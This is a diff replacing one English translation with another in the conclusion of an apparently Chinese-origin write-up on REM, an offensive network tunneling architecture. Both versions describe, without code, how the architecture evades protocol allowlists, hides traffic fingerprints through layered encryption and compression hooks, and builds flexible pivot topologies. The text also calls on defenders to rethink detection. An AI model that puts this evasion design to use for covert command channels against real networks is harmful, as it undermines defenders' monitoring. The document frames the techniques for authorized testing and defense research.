-Grounded in the Chapter 2 stack reconstruction and the Chapter 3 applications, REM forms a full offensive-oriented network-adversarial architecture. The diagram below shows the full stack from base channels to application scenarios:
+Based on the protocol stack reconstruction in Chapter 2 and the application scenarios in Chapter 3, REM has formed a complete attack-oriented network confrontation architecture. The core features lead to a fundamental shift in confrontation dimensions:
 
-**Three core traits**
+- **Boundary Dissolution:** by defining the `net.Conn` interface as a unified boundary, REM allows any medium to become a transport layer, thoroughly dissolving defense systems based on protocol allowlisting.
+- **Feature Concealment:** Programmable Hook mechanisms make traffic characteristics completely unpredictable through dynamic combinations of encryption and compression, thereby thoroughly hiding static fingerprints and behavioral patterns.
+- **Topology Equality:** By abstracting nodes into equal "listening" and "connecting" roles, the same code can flexibly build any network topology, giving every node a dual identity and breaking the rigidity of traditional penetration paths.
 
-**Boundary dissolution:** By defining `net.Conn` as the unified boundary, REM lets any medium become the transport layer, erasing defenses based on protocol allowlists.
+When defense boundaries are dissolved, attack signatures are concealed, and network topologies become equal and fluid, REM is no longer simply evading rules. Instead, by destroying the certainty of protocols, patterns, and structures, it fundamentally dismantles the basic assumptions relied upon by traditional detection, pushing attack and defense from a technical competition to a new level.
 
-**Feature hiding:** The programmable Hook system dynamically composes encryption, compression, etc., making traffic signatures unpredictable and erasing static fingerprints and behavioral patterns.
+### 4.2 Direction of Evolution
 
-**Equal topology:** Nodes are abstracted as symmetric “listen” and “connect” roles; the same code builds any topology, giving every node dual identities and breaking fixed pivot paths.
+**From "Technology Stacking" to "System Reconstruction."** Breakthroughs in point technologies are becoming difficult and short-lived; truly lasting advantages come from systemic architectural innovation. Through the complete reconstruction of the protocol stack, REM gains not a point breakthrough, but an advantage across an entire dimension.
 
-These lead to a **fundamental shift in adversarial dimension**: when boundaries dissolve, signatures vanish, and topology becomes fluid and equal, REM is no longer just evading rules—it destroys the determinism of protocols, patterns, and structures, undermining the assumptions detection relies on and moving offense/defense to a new plane.
+Traditional detection assumes "attack traffic has identifiable characteristics." When attack traffic can have no fixed characteristics, defenders need to shift from "identifying anomalies" to "proving normality." This requires deeper business understanding, more complete context correlation, and more proactive behavioral modeling.
 
-### 4.2 Evolution Directions
+REM's technology can be used for authorized penetration testing, Red/Blue team confrontation, security research, and defense capability verification. Simultaneously, these technologies remind the entire industry:
 
-**From “tech stacking” to “systemic reconstruction.”** Point breakthroughs are getting harder and short-lived; durable advantage comes from architectural innovation. REM’s full stack rebuild yields not just a point gain, but an advantage across dimensions.
+**Next-generation defense systems need to rethink basic assumptions.** If network traffic can have no fixed patterns, if transport media can be any channel, and if protocol processing can be completely decoupled—then detection systems based on protocol identification, traffic analysis, and behavioral patterns need to be rebuilt at a higher level.
 
-Traditional detection assumes “attack traffic has identifiable traits.” When attack traffic can be traitless, defenders must shift from “spotting anomalies” to “proving normality,” requiring deeper business context, richer correlations, and proactive behavior modeling.
-
-REM’s techniques apply to authorized pentests, red/blue, security research, and defense validation. They also signal to the industry:
-
-**Next-gen defenses must revisit their base assumptions.** If traffic can lack fixed patterns, transports can be arbitrary channels, and protocol handling can be fully decoupled, then detection based on protocol ID, traffic analysis, and behavioral patterns must be rebuilt at a higher level.
-
-This isn’t an endpoint—it’s a new starting point for the evolution of network-side adversarial operations.
+This is not the end of technology, but a new starting point for the evolution of network-side confrontation.
